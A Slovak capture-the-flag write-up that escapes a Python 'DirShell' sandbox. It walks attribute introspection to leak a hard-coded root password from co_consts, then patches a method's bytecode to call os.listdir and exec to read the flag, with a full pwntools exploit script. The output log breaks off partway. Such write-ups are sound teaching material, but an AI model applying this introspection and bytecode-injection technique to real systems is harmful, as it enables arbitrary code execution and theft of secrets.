# Zadanie

EN: The admin of this application supposedly implemented a backdoor. Can you find it?

SK: Administrátor tejto aplikácie vraj implementoval backdoor. Dokážeš ho nájsť?

`exp.cybergame.sk:7001`

**Súbory:**

- dictfs.zip
  - src
    - best_dic.py
    - dirshell.py
    - mnt.json
  - Dockerfile
  - flag.txt

## Riešenie

Dockerfile podobný prvej úlohe tohto scenára hovorí, že vlajka je premenovaná na úplne náhodny názov a nachádza sa v koreňovom priečinku súborového systému vnútri dockera.

Zadanie obsahuje tri súbory, best_dict.py, čo je zaujimavá knižnica metód triedy `Dict` na prácu s dictionary a jeho atribútmi, dict_fs je akýsi zdroják, pre terminál na prácu s virtuálnym dictFS súborovým systémom a mnt.json, je samotný súborový system, resp, časť.. Jedna časť súboroveho systému je natívneho typu `dict`, resp je to objekt tohto typu a virtuálny priečinok /mnt je už objekt typu `Dict`. Čo však bije do očí, je skutočnosť, že celý dictFs pracuje s priečinkami ako atribútmi.

```python
def main():
    shell = DirShell()
    while True:
        cmd = input(
            f"/{'/'.join(shell.current_path)}{'#>' if shell.is_root else '$>'} "
        ).split()
        if not cmd:
            continue
        try:
            if cmd[0] == "ls":
                shell.ls()
            elif cmd[0] == "cd":
                if len(cmd) > 1:
                    shell.cd(cmd[1])
            elif cmd[0] == "cat":
                if len(cmd) > 1:
                    shell.cat(cmd[1])
            elif cmd[0] == "touch":
                if len(cmd) > 1:
                    content = input("file contents: ")
                    shell.touch(cmd[1], content)
            elif cmd[0] == "rewrite":
                if len(cmd) > 1:
                    content = input("file contents: ")
                    shell.debug_rewrite(cmd[1], content)
            elif cmd[0] == "su":
                password = input("password: ")
                shell.su(password)
            elif cmd[0] == "pwd":
                shell.pwd()
            elif cmd[0] == "mkdir":
                if len(cmd) > 1:
                    shell.mkdir(cmd[1])

            elif cmd[0] == "exit":
                break
        except Exception as e:
            print("An error occurred", e)
```

Máme k dispozícii sadu príkazov `ls, cd, cat, touch, rewrite, su, pwd, mkdir, exit`, kde `touch, rewrite, mkdir` sú chránené a je potrebné byť prihlásený ako root daného virtuálneho terminálu.

```python
class DirShell:
    def __init__(self):
        print(
            """░▒▓███████▓▒░░▒▓█▓▒░░▒▓██████▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓███████▓▒░      ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░      ░▒▓████████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░     ░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓████▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░        ░▒▓█▓▒░   ░▒▓█▓▒░     ░▒▓█▓▒░              ░▒▓█▓▒▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░        ░▒▓█▓▒░   ░▒▓██████▓▒░ ░▒▓██████▓▒░        ░▒▓█▓▒▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░        ░▒▓█▓▒░   ░▒▓█▓▒░            ░▒▓█▓▒░        ░▒▓█▓▓█▓▒░    ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░            ░▒▓█▓▒░        ░▒▓█▓▓█▓▒░    ░▒▓█▓▒░▒▓██▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓███████▓▒░░▒▓█▓▒░░▒▓██████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░     ░▒▓███████▓▒░          ░▒▓██▓▒░     ░▒▓█▓▒░▒▓██▓▒░▒▓████████▓▒░ 

                                                                                                                        """
        )
        print(
            "Welcome to our completely custom filesystem! you can use the following commands in our in-house built DirShell™:"
        )
        print("ls - list files and directories")
        print("cd <dir> - change directory")
        print("cat <file> - print file contents")
        print("pwd - print current directory")
        print(
            "touch <file> - create/rewrite a file (root only) - if the filename starts with @ it is read-only [beta]"
        )
        print("mkdir <dir> - create a directory (root only) [beta]")
        print(
            "rewrite <file> - rewrite a file with hex characters (root only) - bypasses read-only @ prefix. USE WITH CAUTION [beta]"
        )
        print("su - switch to root user (secret password required)")
        print("exit - exit the shell")

        print("\n\n")
        print(
            "The filesystem is read-only for non-root users but we are experimenting with write capabilities in our current beta version"
        )

        print("\n\n")

        with open("mnt.json", "r") as f:
            mnt = Dict(
                json.load(f)
            )  # we are experimenting with the Dict class as we want to migrate away from `dict` because of the lack of features
        self.filesystem = {
            "a.txt": "I am a test content of a.txt",
            "b.txt": "HELLO WORLD",
            "c.txt": "Lorem ipsum dolor sit amet",
            "x": {"aa.txt": "aaaaaaaa"},
            "mnt": mnt,
            "z": {},
        }

        self.current_path = []
        self.is_root = False
        self.root_password = "<REDACTED>"

    def get_attribute(self, obj, attr):
        if hasattr(obj, attr):
            return getattr(obj, attr)
        else:
            return obj.get(attr)

    def get_current_dir(self, current_path=None):
        current = self.filesystem
        if not current_path:
            current_path = self.current_path
        for dir in current_path:
            try:
                current = getattr(current, dir)
            except:
                current = current.get(dir)
        return current

    def ls(self):
        current = self.get_current_dir()
        files = [
            f
            for f in current.keys()
            if isinstance(current[f], str) or isinstance(current[f], bytes)
        ]
        dirs = [d for d in current.keys() if not isinstance(current[d], str)]
        print("\nfiles:", ", ".join(files))
        print("\ndirs:", ", ".join(dirs))

    def cd(self, dirname):
        if dirname == "..":
            if self.current_path:
                return self.current_path.pop()
        d = self.get_attribute(self.get_current_dir(), dirname)
        if d is not None and not isinstance(d, str):
            self.current_path.append(dirname)
        else:
            print("No such directory")

    def cat(self, filename):
        current = self.get_current_dir()
        print(self.get_attribute(current, filename))

    def touch(self, filename, content):
        if not self.is_root:
            print("Permission denied")
            return
        current = self.get_current_dir()
        try:
            setattr(current, filename, content)
        except AttributeError:
            print(
                "The file you are trying to touch has a @ prefix which makes it read-only"
            )

    def debug_rewrite(self, filename, content):
        if not self.is_root:
            print("Permission denied")
            return
        current = self.get_current_dir()
        if hasattr(current, filename):
            current_copy = self.current_path.copy()
            current_top = current_copy.pop()
            setattr(
                self.get_current_dir(current_path=current_copy),
                current_top,
                current.replace(**{filename: bytes.fromhex(content)}),
            )

    def mkdir(self, dirname):
        if not self.is_root:
            print("Permission denied")
            return
        current = self.get_current_dir()
        setattr(current, dirname, Dict())

    def su(self, password):
        if password == self.root_password:
            self.is_root = True
        else:
            print("Wrong password")

    def pwd(self):
        print(f"/{'/'.join(self.current_path)}")
```

Trieda **DirShell** dokazuje, že celý systém funguje na atribútoch, kde napríklad pri `cd`

vidím, že sa volá metóda `get_attribute` a `get_current_dir`, ktoré v podstate získajú referenciu na daný object... Skúsim získat objekt triedy pomocou dunder `__class__`, rovno začnem z  /mnt... Ešte predtým ako som začal s týmto som prešiel celý slovník mnt a zistil, že ked dám napríklad cat na priečinok, printne mi celý slovník.

```shell
/$> cat mnt
{'home': {'user': {'documents': {'report.txt': 'This is a report about Project X.\nContains information about the project goals and timelines.', 'notes.md': '# Meeting Notes\n\n## 2023-05-15\n- Discussed project milestones\n- Assigned new tasks\n- Set deadline for June 1st', 'todo.txt': '1. Complete project documentation\n2. Update team availability\n3. Prepare for next sprint'}, 'pictures': {'vacation': {'beach.jpg': '[BINARY IMAGE DATA PLACEHOLDER]', 'mountains.jpg': '[BINARY IMAGE DATA PLACEHOLDER]'}, 'profile.png': '[BINARY IMAGE DATA PLACEHOLDER]'}, '.hidden': {'preferences.txt': 'theme: dark\nfont-size: 12pt\nauto-save: true', 'keys': {'license.key': 'XXXX-YYYY-ZZZZ-AAAA-BBBB', 'readme.txt': 'These are license keys for your personal software'}}, '@protected': {'project_notes.txt': 'Project Omega development roadmap and timeline.'}}, '@admin': {'system': {'log.txt': '2023-06-10 08:15:22 - System boot\n2023-06-10 08:15:30 - Network services started\n2023-06-10 09:45:12 - User login\n2023-06-10 10:22:45 - Configuration changed', 'config.json': '{\n  "network": {\n    "hostname": "main-server",\n    "dhcp": false,\n    "ip": "192.168.1.10"\n  },\n  "settings": {\n    "automatic-updates": true,\n    "theme": "dark"\n  }\n}'}, 'users.txt': 'admin:Administrator:admin\nuser1:Regular User:user\nuser2:Developer:user'}}, 'var': {'log': {'access.log': 'Jun 10 08:46:01 localhost http: GET /index.html 200\nJun 10 08:46:05 localhost http: GET /images/logo.png 200', 'system.log': 'Jun 10 08:15:22 localhost kernel: [    0.000000] Linux version 5.10.0\nJun 10 08:15:23 localhost kernel: [    0.126753] Memory: 8046084K/8193020K available'}, 'backups': {'data_backup_20230609.bak': '-- Backup from June 9, 2023\n-- Contains: User settings, system configurations', 'data_backup_20230608.bak': '-- Backup from June 8, 2023\n-- Contains: User settings, system configurations'}}, 'tmp': {'downloads': {'installer.sh': '#!/bin/bash\necho "Starting installation..."\n# Installation script contents', 'package.tar.gz': '[BINARY DATA PLACEHOLDER]'}, 'cache': {}}, 'etc': {'passwd': 'root:0:0:root:/root:/bin/bash\nadmin:1000:1000:Admin User:/home/admin:/bin/bash\nuser:1001:1001:Regular User:/home/user:/bin/bash', 'settings': 'TIMEZONE=UTC\nLANGUAGE=en_US.UTF-8\nHOSTNAME=main-server', 'hosts': '127.0.0.1 localhost\n'}, 'README.md': '# Virtual Filesystem\n\nThis is a virtual filesystem structure for testing the Dict class.\nFiles are represented as strings, directories as nested dictionary objects.'}
```

a pri skúške, čo možem robiť introspekciu pomocou cd dunder som narazil na úspech.. 

```shell
/$> cd mnt
/mnt$> cd __class__
/mnt/__class__$> ls
An error occurred unbound method dict.keys() needs an argument
/mnt/__class__$> cd ..
/mnt$> cat __class__
<class 'best_dict.Dict'>
```

Pri pohľade na metódu touch a debug_rewrite vidím, že môžem vytvoriť atribút (súbor), ale to pri klasickom slovníku nepôjde, `dict` nepodporuje priraďovanie atribútov (iba kľúčov).. Avšak trieda `Dict` má vlastnú metódu `__setattr__`, pri ktorej táto možnosť existuje.. Ak však chcem niečo modifikovať, potrebujem heslo roota. To je však uložené priamo v kóde triedy DirShell a po spustení skriptu a inicializácii objektu je súčasťou `__code__` a hodnoty nájdeme v `co_consts`. Najprv sa však musíme nejako dostať k samotnému objektu DirShell pomocou introspekcie.. Po mnoho pokusoch som sa k tomu dostal touto cestou

```shell
/$> cd mnt
/mnt$> cd __class__
/mnt/__class__$> cd __init__
/mnt/__class__/__init__$> cd __globals__
/mnt/__class__/__init__/__globals__$> cd __builtins__
/mnt/__class__/__init__/__globals__/__builtins__$> cd help
/mnt/__class__/__init__/__globals__/__builtins__/help$> cd __call__
/mnt/__class__/__init__/__globals__/__builtins__/help/__call__$> cd __globals__
/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__$> cd sys
/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__/sys$> cd modules
/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__/sys/modules$> cd __main__
/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__/sys/modules/__main__$> cd DirShell
/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__/sys/modules/__main__/DirShell$> cd __init__
/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__/sys/modules/__main__/DirShell/__init__$> cd __code__
/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__/sys/modules/__main__/DirShell/__init__/__code__$> cat co_consts
(None, '░▒▓███████▓▒░░▒▓█▓▒░░▒▓██████▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓███████▓▒░      ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░      ░▒▓████████▓▒░ \n░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░     ░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓████▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ \n░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░        ░▒▓█▓▒░   ░▒▓█▓▒░     ░▒▓█▓▒░              ░▒▓█▓▒▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ \n░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░        ░▒▓█▓▒░   ░▒▓██████▓▒░ ░▒▓██████▓▒░        ░▒▓█▓▒▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ \n░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░        ░▒▓█▓▒░   ░▒▓█▓▒░            ░▒▓█▓▒░        ░▒▓█▓▓█▓▒░    ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ \n░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░            ░▒▓█▓▒░        ░▒▓█▓▓█▓▒░    ░▒▓█▓▒░▒▓██▓▒░▒▓█▓▒░░▒▓█▓▒░ \n░▒▓███████▓▒░░▒▓█▓▒░░▒▓██████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░     ░▒▓███████▓▒░          ░▒▓██▓▒░     ░▒▓█▓▒░▒▓██▓▒░▒▓████████▓▒░ \n                                                                                                                        \n                                                                                                                        ', 'Welcome to our completely custom filesystem! you can use the following commands in our in-house built DirShell™:', 'ls - list files and directories', 'cd <dir> - change directory', 'cat <file> - print file contents', 'pwd - print current directory', 'touch <file> - create/rewrite a file (root only) - if the filename starts with @ it is read-only [beta]', 'mkdir <dir> - create a directory (root only) [beta]', 'rewrite <file> - rewrite a file with hex characters (root only) - bypasses read-only @ prefix. USE WITH CAUTION [beta]', 'su - switch to root user (secret password required)', 'exit - exit the shell', '\n\n', 'The filesystem is read-only for non-root users but we are experimenting with write capabilities in our current beta version', 'mnt.json', 'r', 'I am a test content of a.txt', 'HELLO WORLD', 'Lorem ipsum dolor sit amet', 'aa.txt', 'aaaaaaaa', ('a.txt', 'b.txt', 'c.txt', 'x', 'mnt', 'z'),
 False, '__YouAreNever$$84982198481nGonnaGu((*8essThiSS_!*&^')
```

kde na konci vidíme hodnoty 

`False` pre `self.is_root` a 

`__YouAreNever$$84982198481nGonnaGu((*8essThiSS_!*&^` pre `self.root_password`

Skúsim

```shell
/$> su
password: __YouAreNever$$84982198481nGonnaGu((*8essThiSS_!*&^
/#>
```

A som root... teraz by som mal mať možnosť vytvárať a meniť atribúty pomocou touch a rewrite priíkazov. rewrite príkaz dokáže meniť len object typu bytes, a tým je napríklad co_code, čo je python bytecode, ktorý sa vykoná, keď zavoláme nejakú funkciu. Samotný bytecote je akási assembly inštrukcia, ktorá sa pozerá na `co_consts` - tuple stringov, ktoré si bytecode vytiahne pomocou indexov, `co_names` - tuple symbolov, `co_varnames` - tuple vlastných premenných, a pod... touch dokáže iba vytvoriť objekt string, a rewrite upraviť object bytes.. Ak chcem vykonať nejaký arbitrary príkaz, budem musieť zmeniť bytecode, ale s obmedzením, že nemôžem nič pridať do kolekcií konštánt, symbolov ani premenných..

Vylistoval som som súbor všetkých `__code__` atribútov všetkých metód triedy DirShell, ktore môžem zavolať cez terminál..

```
=== Function: pwd ===
[pwd -> co_argcount]: 1
[pwd -> co_posonlyargcount]: 0
[pwd -> co_kwonlyargcount]: 0
[pwd -> co_nlocals]: 1
[pwd -> co_stacksize]: 5
[pwd -> co_flags]: 67
[pwd -> co_code]: b't\x00d\x01d\x01\xa0\x01|\x00j\x02\xa1\x01\x9b\x00\x9d\x02\x83\x01\x01\x00d\x00S\x00'
[pwd -> co_consts]: (None, '
[pwd -> co_names]: ('print', 'join', 'current_path')
[pwd -> co_varnames]: ('self',)
[pwd -> co_filename]: 
[pwd -> co_name]: pwd
[pwd -> co_firstlineno]: 141
[pwd -> co_lnotab]: b'\x00\x01'
[pwd -> co_freevars]: ()
[pwd -> co_cellvars]: ()

=== Function: ls ===
[ls -> co_argcount]: 1
[ls -> co_posonlyargcount]: 0
[ls -> co_kwonlyargcount]: 0
[ls -> co_nlocals]: 3
[ls -> co_stacksize]: 5
[ls -> co_flags]: 3
[ls -> co_code]: b'|\x00\xa0\x00\xa1\x00\x89\x00\x87\x00f\x01d\x01d\x02\x84\x08\x88\x00\xa0\x01\xa1\x00D\x00\x83\x01}\x01\x87\x00f\x01d\x03d\x02\x84\x08\x88\x00\xa0\x01\xa1\x00D\x00\x83\x01}\x02t\x02d\x04d\x05\xa0\x03|\x01\xa1\x01\x83\x02\x01\x00t\x02d\x06d\x05\xa0\x03|\x02\xa1\x01\x83\x02\x01\x00d\x00S\x00'
[ls -> co_consts]: (None, <code object <listcomp> at 0x7f1dcd9c23a0, file "
[ls -> co_names]: ('get_current_dir', 'keys', 'print', 'join')
[ls -> co_varnames]: ('self', 'files', 'dirs')
[ls -> co_filename]: 
[ls -> co_name]: ls
[ls -> co_firstlineno]: 77
[ls -> co_lnotab]: b'\x00\x01\x08\x01\n\x02\x06\xfe\x06\x05\x16\x01\x10\x01'
[ls -> co_freevars]: ()
[ls -> co_cellvars]: ('current',)

=== Function: cd ===
[cd -> co_argcount]: 2
[cd -> co_posonlyargcount]: 0
[cd -> co_kwonlyargcount]: 0
[cd -> co_nlocals]: 3
[cd -> co_stacksize]: 4
[cd -> co_flags]: 67
[cd -> co_code]: b'|\x01d\x01k\x02r\x18|\x00j\x00r\x18|\x00j\x00\xa0\x01\xa1\x00S\x00|\x00\xa0\x02|\x00\xa0\x03\xa1\x00|\x01\xa1\x02}\x02|\x02d\x00u\x01rHt\x04|\x02t\x05\x83\x02sH|\x00j\x00\xa0\x06|\x01\xa1\x01\x01\x00n\x08t\x07d\x02\x83\x01\x01\x00d\x00S\x00'
[cd -> co_consts]: (None, '..', 'No such directory')
[cd -> co_names]: ('current_path', 'pop', 'get_attribute', 'get_current_dir', 'isinstance', 'str', 'append', 'print')
[cd -> co_varnames]: ('self', 'dirname', 'd')
[cd -> co_filename]: 
[cd -> co_name]: cd
[cd -> co_firstlineno]: 88
[cd -> co_lnotab]: b'\x00\x01\x08\x01\x06\x01\n\x01\x10\x01\x12\x01\x0e\x02'
[cd -> co_freevars]: ()
[cd -> co_cellvars]: ()

=== Function: cat ===
[cat -> co_argcount]: 2
[cat -> co_posonlyargcount]: 0
[cat -> co_kwonlyargcount]: 0
[cat -> co_nlocals]: 3
[cat -> co_stacksize]: 5
[cat -> co_flags]: 67
[cat -> co_code]: b'|\x00\xa0\x00\xa1\x00}\x02t\x01|\x00\xa0\x02|\x02|\x01\xa1\x02\x83\x01\x01\x00d\x00S\x00'
[cat -> co_consts]: (None,)
[cat -> co_names]: ('get_current_dir', 'print', 'get_attribute')
[cat -> co_varnames]: ('self', 'filename', 'current')
[cat -> co_filename]: 
[cat -> co_name]: cat
[cat -> co_firstlineno]: 98
[cat -> co_lnotab]: b'\x00\x01\x08\x01'
[cat -> co_freevars]: ()
[cat -> co_cellvars]: ()

=== Function: touch ===
[touch -> co_argcount]: 3
[touch -> co_posonlyargcount]: 0
[touch -> co_kwonlyargcount]: 0
[touch -> co_nlocals]: 4
[touch -> co_stacksize]: 8
[touch -> co_flags]: 67
[touch -> co_code]: b'|\x00j\x00s\x12t\x01d\x01\x83\x01\x01\x00d\x00S\x00|\x00\xa0\x02\xa1\x00}\x03z\x10t\x03|\x03|\x01|\x02\x83\x03\x01\x00W\x00n\x1a\x04\x00t\x04yD\x01\x00\x01\x00\x01\x00t\x01d\x02\x83\x01\x01\x00Y\x00n\x020\x00d\x00S\x00'
[touch -> co_consts]: (None, 'Permission denied', 'The file you are trying to touch has a @ prefix which makes it read-only')
[touch -> co_names]: ('is_root', 'print', 'get_current_dir', 'setattr', 'AttributeError')
[touch -> co_varnames]: ('self', 'filename', 'content', 'current')
[touch -> co_filename]: 
[touch -> co_name]: touch
[touch -> co_firstlineno]: 102
[touch -> co_lnotab]: b'\x00\x01\x06\x01\x08\x01\x04\x01\x08\x01\x02\x01\x10\x01\x0c\x01\x02\x01\x02\xff'
[touch -> co_freevars]: ()
[touch -> co_cellvars]: ()

=== Function: mkdir ===
[mkdir -> co_argcount]: 2
[mkdir -> co_posonlyargcount]: 0
[mkdir -> co_kwonlyargcount]: 0
[mkdir -> co_nlocals]: 3
[mkdir -> co_stacksize]: 4
[mkdir -> co_flags]: 67
[mkdir -> co_code]: b'|\x00j\x00s\x12t\x01d\x01\x83\x01\x01\x00d\x00S\x00|\x00\xa0\x02\xa1\x00}\x02t\x03|\x02|\x01t\x04\x83\x00\x83\x03\x01\x00d\x00S\x00'
[mkdir -> co_consts]: (None, 'Permission denied')
[mkdir -> co_names]: ('is_root', 'print', 'get_current_dir', 'setattr', 'Dict')
[mkdir -> co_varnames]: ('self', 'dirname', 'current')
[mkdir -> co_filename]: 
[mkdir -> co_name]: mkdir
[mkdir -> co_firstlineno]: 128
[mkdir -> co_lnotab]: b'\x00\x01\x06\x01\x08\x01\x04\x01\x08\x01'
[mkdir -> co_freevars]: ()
[mkdir -> co_cellvars]: ()

=== Function: su ===
[su -> co_argcount]: 2
[su -> co_posonlyargcount]: 0
[su -> co_kwonlyargcount]: 0
[su -> co_nlocals]: 2
[su -> co_stacksize]: 2
[su -> co_flags]: 67
[su -> co_code]: b'|\x01|\x00j\x00k\x02r\x12d\x01|\x00_\x01n\x08t\x02d\x02\x83\x01\x01\x00d\x00S\x00'
[su -> co_consts]: (None, True, 'Wrong password')
[su -> co_names]: ('root_password', 'is_root', 'print')
[su -> co_varnames]: ('self', 'password')
[su -> co_filename]: 
[su -> co_name]: su
[su -> co_firstlineno]: 135
[su -> co_lnotab]: b'\x00\x01\n\x01\x08\x02'
[su -> co_freevars]: ()
[su -> co_cellvars]: ()

=== Function: debug_rewrite ===
[debug_rewrite -> co_argcount]: 3
[debug_rewrite -> co_posonlyargcount]: 0
[debug_rewrite -> co_kwonlyargcount]: 0
[debug_rewrite -> co_nlocals]: 6
[debug_rewrite -> co_stacksize]: 10
[debug_rewrite -> co_flags]: 67
[debug_rewrite -> co_code]: b'|\x00j\x00s\x12t\x01d\x01\x83\x01\x01\x00d\x00S\x00|\x00\xa0\x02\xa1\x00}\x03t\x03|\x03|\x01\x83\x02r`|\x00j\x04\xa0\x05\xa1\x00}\x04|\x04\xa0\x06\xa1\x00}\x05t\x07|\x00j\x02|\x04d\x02\x8d\x01|\x05|\x03j\x08f\x00i\x00|\x01t\t\xa0\n|\x02\xa1\x01i\x01\xa4\x01\x8e\x01\x83\x03\x01\x00d\x00S\x00'
[debug_rewrite -> co_consts]: (None, 'Permission denied', ('current_path',))
[debug_rewrite -> co_names]: ('is_root', 'print', 'get_current_dir', 'hasattr', 'current_path', 'copy', 'pop', 'setattr', 'replace', 'bytes', 'fromhex')
[debug_rewrite -> co_varnames]: ('self', 'filename', 'content', 'current', 'current_copy', 'current_top')
[debug_rewrite -> co_filename]: 
[debug_rewrite -> co_name]: debug_rewrite
[debug_rewrite -> co_firstlineno]: 114
[debug_rewrite -> co_lnotab]: b'\x00\x01\x06\x01\x08\x01\x04\x01\x08\x01\n\x01\n\x01\x08\x01\x02\x01\n\x01\x02\x01\x18\xfd'
[debug_rewrite -> co_freevars]: ()
[debug_rewrite -> co_cellvars]: ()
```

Potrebujem prečítať súbor s vlajkou, ktorého názov neviem, takže najprv musím zistiť názov. To môžem pomocou `listdir / ` a keď viem názov, tak potom `exec(print(open('/vlajkafajl.txt').read()))` . Ale žiadny príkaz nemá v `co_names` takýto symbol.. Ale bude mi stačiť taký, ktorý má v symoloch `get_current_dir`, čo je metóda, ktorá mi dá referenciu na object aktuálneho priečinka, čo môže byť vďaka introspekcii aj referencia na funkciu... To sú konkrétne `ls, cd, cat, touch, mkdir a debug_rewrite` , potrebujem ale taký, ktorému viem zadať aj argument, to nám množinu skráti o `ls`. Osobne sa mi páči `touch` - má `get_current_dir, print` - `get_current_dir` mi dá do varnames[3], čo je `current` referenciu na napriíklad `listdir, exec` a zároveň má premenné varnames[1] - filename, čo je atribút pre touch a varnames[2] - content, čo sa nás po zadaní príkazu touch s akýmkoľvek argumentom spýta na obsah, tu vieme zadať čokoľvek..

Bytecode pre získanie názvu vlajky by som definoval takto

| Inštrukcia    | Opcode (Hex) | Argument | Popis                                                        | Zásobník (Stack) po operácii  |
| ------------- | ------------ | -------- | ------------------------------------------------------------ | ----------------------------- |
| LOAD_GLOBAL   | 74           | 1        | Načíta print<br> (co_names[1])                               | [print]                       |
| LOAD_FAST     | 7C           | 0        | Načíta self<br> (co_varnames[0])                             | [print, self]                 |
| LOAD_METHOD   | A0           | 2        | Načíta metódu<br> get_current_dir (co_names[2]) z self       | [print, unbound_method, self] |
| CALL_METHOD   | A1           | 0        | Zavolá metódu s 0<br> argumentmi                             | [print, listdir/exec]         |
| LOAD_FAST     | 7C           | 2        | Načíta content<br> (co_varnames[2], ktory zadam)             | [print, listdir/exec, '...']  |
| CALL_FUNCTION | 83           | 1        | Zavolá listdir/exec s 1<br> argumentom                       | [print, result]               |
| CALL_FUNCTION | 83           | 1        | Zavolá print s 1<br> argumentom (result)                     | [None] (print vracia None)    |
| POP_TOP       | 1            |          | Odstráni None zo<br> zásobníka                               | []                            |
| LOAD_CONST    | 64           | 0        | Načíta None<br> (co_consts[0]) pre návratovú hodnotu funkcie | [None]                        |
| RETURN_VALUE  | 53           | 0        | Vráti hodnotu zo<br> zásobníka (None)                        | []                            |

a po zavolaní `touch dummy` v priečinku listdir a zadaní `/` pre content

`/mnt/__class__/__init__/__globals__/__builtins__/listdir#> touch dummy`

by sa mala získať vďaka `get_current_dir` referencia na funckiu `listdir`, zavolať sa táto funckia s argumentom `/`, ktorá vráti list a ten printneme... reálne akoby v runtime zmením zdrojový kód metódy na 

```python
def touch(self, filename, content):
    print(self.get_current_dir()(content))
```

kde get_current_dir() sa akoby zmení na `listdir` a content je `/`. Nie je to úplne presné, ale pricipiálne získame referenciu na funckiu a tú zavolám.

Keď vieme názov súboru, vedel by som využiť `exec` a s tým istým bajtcode zavolať `print(open('/vlajkafajl.txt').read())` keď budem v `exec` priečinku.

Bajkód je teda `74017c00a002a1007c02830183010164005300` a funkcia rewrite bude pýtať hex string, ktorý pretaví na bajty a zapíše.. 

```python
from pwn import *
import re

# Pripojenie k serveru
p = remote('exp.cybergame.sk', 7001)
p.recvuntil(b'$> ')

# Pomocná funkcia na odoslanie a zobrazenie príkazu
def send_and_print(cmd):
    print(f"Sending > \"{cmd.decode()}\"")
    p.sendline(cmd)

# Prihlásenie ako root
send_and_print(b'su')
print(p.recvuntil(b'password'))

send_and_print(b'__YouAreNever$$84982198481nGonnaGu((*8essThiSS_!*&^')
print(p.recvuntil(b'#> '))

# Funkcia na prepísanie bajtkódu
def rewrite_bytecode():
    send_and_print(b'rewrite co_code')
    print(p.recvuntil(b'file contents: '))

    # Jednoduchý bajtkód (napr. eval alebo exec funkcia)
    bytecode = b'74017c00a002a1007c02830183010164005300'
    send_and_print(bytecode)
    print(p.recvuntil(b'#> '))

# Funkcia na zavolanie funkcie listdir alebo exec
def touch_file(arg2):
    send_and_print(b'touch asdfhlakj')
    print(p.recvuntil(b'file contents: '))

    send_and_print(arg2)  
    resp = p.recvuntil(b'#> ')
    print(resp)

    if arg2 == b"/":
        match = re.search(r"'([^']+\.txt)'", resp.decode('utf-8', errors='ignore'))
        if match:
            filename = match.group(1)
            print("Nájdený súbor:", filename)
            return filename
        else:
            print("Súbor s príponou .txt nebol nájdený.")
            return None
    else:
        match = re.search(r'SK-CERT\{.*?\}', resp.decode('utf-8', errors='ignore'))
        if match:
            print("Nájdený flag:", match.group(0))
        else:
            print("Flag nebol nájdený.")

# "Preklikávanie" sa cez objektovú štruktúru
path_chain = (
    "mnt/__class__/__init__/__globals__/__builtins__/"
    "help/__call__/__globals__/sys/modules/"
    "__main__/DirShell/touch/__code__"
)

for segment in path_chain.split('/'):
    send_and_print(b'cd ' + segment.encode())
    print(p.recvuntil(b'#> '))

# Prepísanie bajtkódu
rewrite_bytecode()

# Prístup k funkcii listdir v module os
for segment in "../../../../os/listdir".split('/'):
    send_and_print(b'cd ' + segment.encode())
    print(p.recvuntil(b'#> '))

# Vypísanie dostupných súborov v root adresári
flag_filename = touch_file(b"/")

# Presun do exec funkcie na spustenie kódu
for segment in "../../../../../../../exec".split('/'):
    send_and_print(b'cd ' + segment.encode())
    print(p.recvuntil(b'#> '))

# Pokus o načítanie obsahu flag súboru
if flag_filename:
    command = f"print(open('/{flag_filename}').read())".encode()
    touch_file(command)

# p.interactive()
```

vráti

```
[x] Opening connection to exp.cybergame.sk on port 7001
[x] Opening connection to exp.cybergame.sk on port 7001: Trying 195.168.112.4
[+] Opening connection to exp.cybergame.sk on port 7001: Done
b'password'
b': /#> '
b'/mnt#> '
b'/mnt/__class__#> '
b'/mnt/__class__/__init__#> '
b'/mnt/__class__/__init__/__globals__#> '
b'/mnt/__class__/__init__/__globals__/__builtins__#> '
b'/mnt/__class__/__init__/__globals__/__builtins__/help#> '
b'/mnt/__class__/__init__/__globals__/__builtins__/help/__call__#> '
b'/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__#> '
b'/mnt/__class__/__init__/__globals__/__builtins__/help/__call__/__globals__/sys#> '
